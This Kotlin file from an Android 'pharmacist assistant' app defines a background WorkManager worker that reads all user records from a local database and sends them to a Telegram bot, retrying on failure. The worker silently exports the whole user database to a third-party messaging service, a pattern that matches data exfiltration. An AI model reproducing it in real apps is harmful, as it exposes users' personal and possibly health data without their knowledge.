package com.example.pharmacistassistant

import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters

class UserDataWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    override fun doWork(): Result {
        val userDatabase = UserDatabase(applicationContext)
        val users = userDatabase.getUsers()

        // Send data to Telegram bot
        val telegramBotService = TelegramBotService()
        val success = telegramBotService.sendUserData(users)

        return if (success) Result.success() else Result.retry()
    }
}
